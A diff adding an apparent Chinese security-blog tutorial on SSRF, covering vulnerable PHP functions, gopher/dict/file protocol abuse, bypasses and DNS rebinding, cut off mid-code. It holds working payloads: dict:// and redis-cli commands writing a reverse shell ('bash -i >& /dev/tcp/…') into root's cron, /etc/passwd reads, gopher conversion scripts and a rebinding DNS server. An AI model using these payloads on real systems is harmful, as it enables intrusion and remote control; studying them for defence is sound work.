@@ -1,0 +1,921 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='go!'><title>SSRF 相关</title>
+
+<link rel='canonical' href='https://coollllllll.github.io/p/ssrf/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='SSRF 相关'>
+<meta property='og:description' content='go!'>
+<meta property='og:url' content='https://coollllllll.github.io/p/ssrf/'>
+<meta property='og:site_name' content='cOOl &#39;s blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2020-10-09T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2020-10-09T00:00:00&#43;00:00'/><meta property='og:image' content='https://coollllllll.github.io/p/ssrf/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg' />
+<meta name="twitter:title" content="SSRF 相关">
+<meta name="twitter:description" content="go!"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://coollllllll.github.io/p/ssrf/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg' />
+    </head>
+    <body class="
+    article-page has-toc
+">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex 
+    
+        extended
+    
+">
+    
+        <div id="article-toolbar">
+            <a href="/" class="back-home">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+                <span>返回</span>
+            </a>
+        </div>
+    
+<main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/ssrf/">
+                <img src="/p/ssrf/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_800x0_resize_q75_box.jpg"
+                        srcset="/p/ssrf/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_800x0_resize_q75_box.jpg 800w, /p/ssrf/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_1600x0_resize_q75_box.jpg 1600w"
+                        width="800" 
+                        height="534" 
+                        loading="lazy"
+                        alt="Featured image of post SSRF 相关" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E5%B8%B8%E7%94%A8/" style="background-color: #2a9d8f; color: #fff;">
+                常用
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/p/ssrf/">SSRF 相关</a>
+    </h2>
+
+    
+    <h3 class="article-subtitle">
+        go!
+    </h3>
+    
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Oct 09, 2020</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 8 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+</div>
+</header>
+
+    <section class="article-content">
+    <h1 id="ssrf">SSRF</h1>
+<h2 id="定义">定义</h2>
+<p>服务端请求伪造:Server-Side Request Forgery，由攻击者构造使服务端发起请求的漏洞。该请求可以发送至本机、本机所在内网其他服务器、外网等。</p>
+<p>一般情况下针对<code>无法从外网直接访问的内部系统</code>。</p>
+<h2 id="原理">原理</h2>
+<p>服务端提供从其他服务器获取应用数据的功能，但是对其他服务器的地址没有过滤和限制。例如指定url获取网页文本、加载图片等等。</p>
+<p>本质上就是利用存在漏洞的服务器作为跳板攻击内部或远程服务器。</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 122; 
+			flex-basis: 293px"
+	>
+	<a href="/p/ssrf/image-20211219200220919.png" data-size="1168x956">
+		<img src="/p/ssrf/image-20211219200220919.png"
+			width="1168"
+			height="956"
+			srcset="/p/ssrf/image-20211219200220919_hu80adfba74d957e51070a997d28508bf2_202188_480x0_resize_box_3.png 480w, /p/ssrf/image-20211219200220919_hu80adfba74d957e51070a997d28508bf2_202188_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<h2 id="常见漏洞场景">常见漏洞场景</h2>
+<h3 id="加载图片等资源">加载图片等资源</h3>
+<pre tabindex="0"><code>http://www.test.com/xxx.php?url=http://127.0.0.1
+</code></pre><p>例如某应用加载选择从远程服务器加载图片到本地，如上述url，如果未作限制和过滤可能会存在漏洞</p>
+<h3 id="分享功能">分享功能</h3>
+<pre tabindex="0"><code>http://www.test.com/xxx.php?url=http://www.haha.com
+</code></pre><p>例如某应用通过传递url参数的方式进行分享内容的跳转</p>
+<h3 id="收藏功能">收藏功能</h3>
+<pre tabindex="0"><code>http://www.test.com/xxx.php?url=http://www.test.com/aaa
+</code></pre><p>例如某应用通过传递url参数进行文章、图片等内容的收藏</p>
+<h3 id="网页源代码中查找带有关键词的url或接口">网页源代码中查找带有关键词的url或接口</h3>
+<p>share、wap、url、src、source、target、u、3g、display、sourceURl、imageURL、domain等等</p>
+<h3 id="php中常见的可能引发ssrf的函数">PHP中常见的可能引发SSRF的函数</h3>
+<ul>
+<li>file_get_contents()</li>
+</ul>
+<pre tabindex="0"><code>如果file_get_contents函数参数可控，可构造url获取本地敏感文件
+</code></pre><ul>
+<li>fsockopen()</li>
+</ul>
+<pre tabindex="0"><code>fsockopen(
+    string $hostname,
+    int $port = -1,
+    int &amp;$errno = ?,
+    string &amp;$errstr = ?,
+    float $timeout = ini_get(&quot;default_socket_timeout&quot;)
+): resource
+该函数打开一个网络连接或者Unix套接字连接到指定主机($hostname)，返回一个文件句柄，之后可以被其他文件类函数调用（例如：fgets()，fgetss()，fwrite()，fclose()还有feof()）。如果调用失败，将返回false。
+</code></pre><ul>
+<li>curl_exec()</li>
+</ul>
+<pre tabindex="0"><code>&lt;?php
+$link = $_GET['url'];
+// 创建一个cURL资源
+$ch = curl_init();
+
+// 设置URL和相应的选项
+curl_setopt($ch, CURLOPT_URL, $link);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+
+// 抓取URL并把它传递给浏览器
+curl_exec($ch);
+
+// 关闭cURL资源，并且释放系统资源
+curl_close($ch);
+?&gt;
+</code></pre><h2 id="常见利用方式">常见利用方式</h2>
+<ul>
+<li>可以对本机、外网、内网其他服务器进行端口扫描并获取一些服务的 banner</li>
+<li>攻击运行在内网或本地的应用程序，如redis、mysql等</li>
+<li>对内网其他web 应用进行指纹识别(一般通过请求一些常见的默认指纹文件实现)</li>
+<li>以当前目标为跳板攻击内外网的 web 应用，一般是使用 get 参数就可以实现的攻击(比如 Struts2 漏洞利用，SQL 注入等)</li>
+<li>利用 file 协议读取本地文件</li>
+</ul>
+<h2 id="常用协议">常用协议</h2>
+<h3 id="file">file</h3>
+<p>该协议主要获取本机文件，当有回显时，可用来读取本机敏感文件</p>
+<pre tabindex="0"><code>file:///etc/passwd
+</code></pre><h3 id="dict">dict</h3>
+<p>词典网络协议，通常用于探测内网端口开放情况，但一般只能探测带TCP回显的端口；</p>
+<p>也可用于攻击存在未授权的redis</p>
+<pre tabindex="0"><code>dict://x.x.x.x:8080/
+
+dict://x.x.x.x:6379/&lt;Redis 命令&gt;
+</code></pre><h3 id="gopher">Gopher</h3>
+<p>gopher 是一个互联网上使用的分布型的文件搜集和获取网络协议，它将Internet上的文件组织成某种索引，方便用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口，支持多个数据包整合发送。<strong>只支持文本，不支持图像</strong></p>
+<p>gopher 协议支持发出 GET、POST 请求：可以先截获 get 请求包和 post 请求包，再构造成符合 gopher 协议的请求。 gopher 协议是 ssrf 利用中一个最强大的协议(俗称万能协议)</p>
+<h4 id="协议格式">协议格式</h4>
+<pre tabindex="0"><code>gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_&lt;TCP数据流&gt;
+</code></pre><blockquote>
+<p>注意不可省略下划线<code>_</code>，该字符可以替换为任何字符，但一定要存在</p>
+<p>gopher-path可省略</p>
+</blockquote>
+<p><strong>为了得到目标服务的TCP数据流，往往需要使用wireshark、socat等工具抓取原始流量</strong>，再对原始流量进行处理</p>
+<blockquote>
+<p>使用gopher发送payload需要进行url编码</p>
+<p>当gopher数据包位于http请求中，可能还需要多次url编码</p>
+</blockquote>
+<h4 id="gopher协议构造getpost请求">gopher协议构造GET、POST请求</h4>
+<p>服务端：</p>
+<pre tabindex="0"><code>&lt;?php
+echo &quot;hahaha: &quot;.$_GET[&quot;haha&quot;].&quot;\n&quot;;
+?&gt;
+</code></pre><p>使用bp抓到GET请求包：</p>
+<pre tabindex="0"><code>GET /ssrf/test.php?haha=ssrf HTTP/1.1
+Host: 192.168.66.55
+</code></pre><p>为了构造HTTP协议格式的TCP流，编写转换脚本：</p>
+<pre tabindex="0"><code># HTTP协议每行结尾都是&quot;\r\n&quot;
+
+
+import urllib.parse as urlparse
+data = &quot;&quot;&quot;GET /ssrf/test.php?haha=ssrf HTTP/1.1
+Host: 192.168.66.55
+&quot;&quot;&quot;
+ip = &quot;192.168.66.55&quot;
+port = 80
+
+encode_data = urlparse.quote(data)
+encode_data = encode_data.replace('%0A','%0D%0A')
+result = 'gopher://{0}:{1}/'.format(ip, port) + '_' + encode_data
+print(result)
+</code></pre><p>转换结果如下：</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 4385; 
+			flex-basis: 10524px"
+	>
+	<a href="/p/ssrf/image-20211219220420070.png" data-size="1184x27">
+		<img src="/p/ssrf/image-20211219220420070.png"
+			width="1184"
+			height="27"
+			srcset="/p/ssrf/image-20211219220420070_hu383d941de1d3c885528168609309e9c3_24201_480x0_resize_box_3.png 480w, /p/ssrf/image-20211219220420070_hu383d941de1d3c885528168609309e9c3_24201_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="image-20211219220420070">
+	</a>
+	
+	<figcaption>image-20211219220420070</figcaption>
+	
+</figure></p>
+<p>发送gopher请求：</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 833; 
+			flex-basis: 2001px"
+	>
+	<a href="/p/ssrf/image-20211219220805486.png" data-size="1843x221">
+		<img src="/p/ssrf/image-20211219220805486.png"
+			width="1843"
+			height="221"
+			srcset="/p/ssrf/image-20211219220805486_hu821be4013b84d426abcb7751870d11b0_50404_480x0_resize_box_3.png 480w, /p/ssrf/image-20211219220805486_hu821be4013b84d426abcb7751870d11b0_50404_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<blockquote>
+<p>构造POST请求类似如上，但需要注意POST请求必须包含应有的请求头，即POST、Host、Content-Type和Content-Length(为数据体内容的长度)</p>
+</blockquote>
+<h3 id="漏洞利用">漏洞利用</h3>
+<h4 id="获取本地信息">获取本地信息</h4>
+<pre tabindex="0"><code># 读取敏感文件
+file:///etc/passwd
+
+file:///etc/hosts
+
+/proc/net/arp
+/etc/network/interfaces
+</code></pre><pre tabindex="0"><code># 探测端口
+dict://127.0.0.1:6379/info
+</code></pre><h4 id="攻击未授权redis">攻击未授权Redis</h4>
+<ul>
+<li>有web尝试写webshell</li>
+<li>若支持SSH公钥认证尝试写公钥</li>
+<li>写定时任务</li>
+</ul>
+<p><strong>dict协议</strong></p>
+<pre tabindex="0"><code>dict://127.0.0.1:6379/flushall
+
+# 定时任务目录
+dict://127.0.0.1:6379/config set dir /var/spool/cron/
+
+# root用户的定时任务文件
+dict://127.0.0.1:6379/config set dbfilename root
+
+# 写反弹shell的payload
+dict://127.0.0.1:6379/set x &quot;\n* * * * * /bin/bash -i &gt;%26 /dev/tcp/x.x.x.x/7777 0&gt;%261\n&quot;
+
+dict://127.0.0.1:6379/save
+</code></pre><blockquote>
+<p><code>&amp;</code>符号需要url编码</p>
+</blockquote>
+<p><strong>gopher协议</strong></p>
+<p>编写脚本：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">redis-cli -h <span class="nv">$1</span> -p <span class="nv">$2</span> flushall
+<span class="nb">echo</span> -e <span class="s2">&#34;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.66.64/8888 0 &gt;&amp;1\n\n&#34;</span><span class="p">|</span>redis-cli -h <span class="nv">$1</span> -p <span class="nv">$2</span> -x <span class="nb">set</span> haha
+redis-cli -h <span class="nv">$1</span> -p <span class="nv">$2</span> config <span class="nb">set</span> dir /var/spool/cron
+redis-cli -h <span class="nv">$1</span> -p <span class="nv">$2</span> config <span class="nb">set</span> dbfilename root
+redis-cli -h <span class="nv">$1</span> -p <span class="nv">$2</span> save
+redis-cli -h <span class="nv">$1</span> -p <span class="nv">$2</span> quit
+</code></pre></div><p>使用 socat 模拟抓取原始的 Redis 数据流量：</p>
+<pre tabindex="0"><code>socat -v TCP-LISTEN:7777,fork TCP-CONNECT:192.168.66.64:6379
+</code></pre><p>执行脚本：</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 478; 
+			flex-basis: 1147px"
+	>
+	<a href="/p/ssrf/image-20211226113048545.png" data-size="899x188">
+		<img src="/p/ssrf/image-20211226113048545.png"
+			width="899"
+			height="188"
+			srcset="/p/ssrf/image-20211226113048545_hua09dad7b16bcbac134bf784e83f4b1cd_18676_480x0_resize_box_3.png 480w, /p/ssrf/image-20211226113048545_hua09dad7b16bcbac134bf784e83f4b1cd_18676_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>获取到的中间流量：</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 128; 
+			flex-basis: 308px"
+	>
+	<a href="/p/ssrf/image-20211226113126018.png" data-size="1006x782">
+		<img src="/p/ssrf/image-20211226113126018.png"
+			width="1006"
+			height="782"
+			srcset="/p/ssrf/image-20211226113126018_hu57cbc12f2bafb6134f43392144451f28_91385_480x0_resize_box_3.png 480w, /p/ssrf/image-20211226113126018_hu57cbc12f2bafb6134f43392144451f28_91385_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>流量转换：</p>
+<p>流量抓换的目的是构造符合目标服务的TCP数据流，观察发现抓取到的流量是<code>\r</code>结尾，而Redis是以CRLF (<code>\r\n</code>)结尾，所以要进行替换，并进行字符url编码</p>
+<p>转换脚本：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="c1"># coding: utf-8</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">exp</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">():</span>
+        <span class="k">if</span> <span class="n">line</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="ow">in</span> <span class="s1">&#39;&gt;&lt;+&#39;</span><span class="p">:</span>
+            <span class="k">continue</span>
+        <span class="c1"># 判断倒数第 2、3 字符串是否为 \r</span>
+        <span class="k">elif</span> <span class="n">line</span><span class="p">[</span><span class="o">-</span><span class="mi">3</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="sa">r</span><span class="s1">&#39;\r&#39;</span><span class="p">:</span>
+            <span class="c1"># 如果该行只有 \r，将 \r 替换成 %0a%0d%0a</span>
+            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">line</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
+                <span class="n">exp</span> <span class="o">=</span> <span class="n">exp</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="si">%0a%0d%0a</span><span class="s1">&#39;</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;\r&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="si">%0d%0a</span><span class="s1">&#39;</span><span class="p">)</span>
+                <span class="c1"># 去掉最后的换行符</span>
+                <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
+                <span class="n">exp</span> <span class="o">=</span> <span class="n">exp</span> <span class="o">+</span> <span class="n">line</span>
+        <span class="c1"># 判断是否是空行，空行替换为 %0a</span>
+        <span class="k">elif</span> <span class="n">line</span> <span class="o">==</span> <span class="s1">&#39;</span><span class="se">\x0a</span><span class="s1">&#39;</span><span class="p">:</span>
+            <span class="n">exp</span> <span class="o">=</span> <span class="n">exp</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="si">%0a</span><span class="s1">&#39;</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
+            <span class="n">exp</span> <span class="o">=</span> <span class="n">exp</span> <span class="o">+</span> <span class="n">line</span>
+<span class="nb">print</span> <span class="n">exp</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;$&#34;</span><span class="p">,</span> <span class="s2">&#34;%24&#34;</span><span class="p">)</span>
+</code></pre></div><p>转换后的结果：</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 1146; 
+			flex-basis: 2752px"
+	>
+	<a href="/p/ssrf/image-20211227185517677.png" data-size="1548x135">
+		<img src="/p/ssrf/image-20211227185517677.png"
+			width="1548"
+			height="135"
+			srcset="/p/ssrf/image-20211227185517677_hu45259c80a70780429f50887c146c93df_51696_480x0_resize_box_3.png 480w, /p/ssrf/image-20211227185517677_hu45259c80a70780429f50887c146c93df_51696_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>使用curl发送gopher协议数据包，可成功执行Redis命令写入计划任务：</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 364; 
+			flex-basis: 875px"
+	>
+	<a href="/p/ssrf/image-20211227185936894.png" data-size="1547x424">
+		<img src="/p/ssrf/image-20211227185936894.png"
+			width="1547"
+			height="424"
+			srcset="/p/ssrf/image-20211227185936894_hu4cc1691c2804386476917c654e780589_99874_480x0_resize_box_3.png 480w, /p/ssrf/image-20211227185936894_hu4cc1691c2804386476917c654e780589_99874_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>可使用<strong>Gopherus</strong>工具<code>https://github.com/tarunkant/Gopherus</code>，直接生成exp：</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 261; 
+			flex-basis: 628px"
+	>
+	<a href="/p/ssrf/image-20211227191605334.png" data-size="1973x754">
+		<img src="/p/ssrf/image-20211227191605334.png"
+			width="1973"
+			height="754"
+			srcset="/p/ssrf/image-20211227191605334_hu45904ef55333a734c009b2c0a9f2d964_196160_480x0_resize_box_3.png 480w, /p/ssrf/image-20211227191605334_hu45904ef55333a734c009b2c0a9f2d964_196160_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<h4 id="攻击未授权mysql">攻击未授权MySQL</h4>
+<p>当MySQL无需密码认证时可直接发送 TCP/IP 数据包。因此在SSRF漏洞下可直接利用gopher攻击无认证的MySQL。</p>
+<p>tcpdump抓取原始数据包：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="c1"># lo 本地回环网卡</span>
+tcpdump -i lo port <span class="m">3306</span> -w mysql.pcapng
+</code></pre></div><p><strong>有待解决？？？ 未利用成功</strong></p>
+<h2 id="绕过方式">绕过方式</h2>
+<h3 id="ip">IP</h3>
+<ul>
+<li>短网址302跳转</li>
+<li>域名解析到内网，例如<strong>127.0.0.1.xip.io &gt; 127.0.0.1</strong></li>
+<li>改写IP
+<ul>
+<li>192.168.1.1</li>
+<li>八进制：0300.0250.1.1</li>
+<li>十六进制：0xC0.0xA8.1.1</li>
+<li>十进制整数格式(C0A80101的十进制数)：3232235777</li>
+<li>十六进制数格式：0xC0A80101</li>
+</ul>
+</li>
+<li>@：<strong><a class="link" href="http://www.baidu.com"  target="_blank" rel="noopener"
+    >http://www.baidu.com</a>@192.168.1.1/ &gt; http://192.168.1.1</strong></li>
+</ul>
+<h3 id="dns-重绑定">DNS 重绑定</h3>
+<h4 id="原理-1">原理</h4>
+<p>常见的针对SSRF的修复方案如下：</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 108; 
+			flex-basis: 259px"
+	>
+	<a href="/p/ssrf/image-20211228201857858.png" data-size="1282x1187">
+		<img src="/p/ssrf/image-20211228201857858.png"
+			width="1282"
+			height="1187"
+			srcset="/p/ssrf/image-20211228201857858_hu37f67c7fa47eb6cbcbc857334992fdfe_268106_480x0_resize_box_3.png 480w, /p/ssrf/image-20211228201857858_hu37f67c7fa47eb6cbcbc857334992fdfe_268106_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>即：先对url中的host进行DNS解析，根据解析到的IP进行白名单判断，不在白名单范围就拒绝请求，在范围内服务端就请求该url。当服务端进行url请求时会进行第二次DNS解析，然而两次DNS解析明显存在时间差，可利用时间差绕过。</p>
+<p><strong>DNS中TTL</strong>指的是域名和IP绑定关系的Cache在DNS上存活的最长时间，在这个时间内当域名到达后且缓存里有该域名记录，则直接返回缓存好的结果，如果超过TTL则丢弃缓存，当域名到达后就会重新向上层域名服务器请求解析，再重新建立缓存。</p>
+<p>因此要利用时间差进行重绑定本质就是：<strong>利用两次解析同一域名的间隙(超过了TTL)，更换域名解析结果从而绕过防御。</strong></p>
+<p>实际情况中会有不理想的情况：</p>
+<ul>
+<li>java中DNS请求成功的话默认缓存30s(字段为networkaddress.cache.ttl，默认情况下没有设置)，失败的默认缓存10s。可在/Library/Java/JavaVirtualMachines/jdk/Contents/Home/jre/lib/security/java.security 中配置</li>
+<li>在php中则默认没有缓存</li>
+<li>Linux默认不会进行DNS缓存，mac和windows会缓存</li>
+<li>有些公共DNS服务器，比如114.114.114.114会把记录进行缓存，但是8.8.8.8是严格按照DNS协议去管理缓存的，如果设置TTL为0，则不会进行缓存</li>
+</ul>
+<h4 id="利用">利用</h4>
+<p><strong>在线平台：</strong></p>
+<ul>
+<li><a class="link" href="https://lock.cmpxchg8b.com/rebinder.html"  target="_blank" rel="noopener"
+    >https://lock.cmpxchg8b.com/rebinder.html</a></li>
+<li><a class="link" href="https://requestrepo.com/"  target="_blank" rel="noopener"
+    >https://requestrepo.com/</a></li>
+</ul>
+<p><strong>自建DNS服务：</strong></p>
+<ol>
+<li>首先需要指定某域名的域名服务器，设置NS记录：test.com NS dns.com</li>
+<li>也要有自建dns服务器(dns.com)的A记录，指明其IP：dns.com A 39.94.x.x</li>
+<li>自建服务器的DNS解析实现，使用python的 twisted.names(一个建立DNS服务端和客户端的库)：</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">twisted.internet</span> <span class="kn">import</span> <span class="n">reactor</span><span class="p">,</span> <span class="n">defer</span>
+<span class="kn">from</span> <span class="nn">twisted.names</span> <span class="kn">import</span> <span class="n">client</span><span class="p">,</span> <span class="n">dns</span><span class="p">,</span> <span class="n">error</span><span class="p">,</span> <span class="n">server</span>
+
+
+<span class="n">record</span><span class="o">=</span><span class="p">{}</span>
+<span class="k">class</span> <span class="nc">DynamicResolver</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
+    <span class="k">def</span> <span class="nf">_doDynamicResponse</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">query</span><span class="p">):</span>
+        <span class="n">name</span> <span class="o">=</span> <span class="n">query</span><span class="o">.</span><span class="n">name</span><span class="o">.</span><span class="n">name</span>
+        <span class="k">if</span> <span class="n">name</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">record</span> <span class="ow">or</span> <span class="n">record</span><span class="p">[</span><span class="n">name</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">:</span>
+            <span class="c1"># 随意一个可绕过检查的IP</span>
+            <span class="n">ip</span> <span class="o">=</span> <span class="s2">&#34;104.160.43.154&#34;</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">ip</span><span class="o">=</span><span class="s2">&#34;127.0.0.1&#34;</span>
+        <span class="k">if</span> <span class="n">name</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">record</span><span class="p">:</span>
+            <span class="n">record</span><span class="p">[</span><span class="n">name</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span>
+        <span class="n">record</span><span class="p">[</span><span class="n">name</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">1</span>
+        <span class="nb">print</span> <span class="n">name</span> <span class="o">+</span> <span class="s2">&#34; ===&gt; &#34;</span> <span class="o">+</span> <span class="n">ip</span>
+        <span class="n">answer</span> <span class="o">=</span> <span class="n">dns</span><span class="o">.</span><span class="n">RRHeader</span><span class="p">(</span>
+            <span class="n">name</span><span class="o">=</span><span class="n">name</span><span class="p">,</span>
+            <span class="nb">type</span><span class="o">=</span><span class="n">dns</span><span class="o">.</span><span class="n">A</span><span class="p">,</span>
+            <span class="bp">cls</span><span class="o">=</span><span class="n">dns</span><span class="o">.</span><span class="n">IN</span><span class="p">,</span>
+            <span class="n">ttl</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span>
+            <span class="n">payload</span><span class="o">=</span><span class="n">dns</span><span class="o">.</span><span class="n">Record_A</span><span class="p">(</span><span class="n">address</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;</span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">ip</span><span class="p">,</span><span class="n">ttl</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+        <span class="p">)</span>
+        <span class="n">answers</span> <span class="o">=</span> <span class="p">[</span><span class="n">answer</span><span class="p">]</span>
+        <span class="n">authority</span> <span class="o">=</span> <span class="p">[]</span>
+        <span class="n">additional</span> <span class="o">=</span> <span class="p">[]</span>
+        <span class="k">return</span> <span class="n">answers</span><span class="p">,</span> <span class="n">authority</span><span class="p">,</span> <span class="n">additional</span>
+    <span class="k">def</span> <span class="nf">query</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">query</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">defer</span><span class="o">.</span><span class="n">succeed</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">_doDynamicResponse</span><span class="p">(</span><span class="n">query</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">factory</span> <span class="o">=</span> <span class="n">server</span><span class="o">.</span><span class="n">DNSServerFactory</span><span class="p">(</span>
+        <span class="n">clients</span><span class="o">=</span><span class="p">[</span><span class="n">DynamicResolver</span><span class="p">(),</span> <span class="n">client</span><span class="o">.</span><span class="n">Resolver</span><span class="p">(</span><span class="n">resolv</span><span class="o">=</span><span class="s1">&#39;/etc/resolv.conf&#39;</span><span class="p">)]</span>
+    <span class="p">)</span>
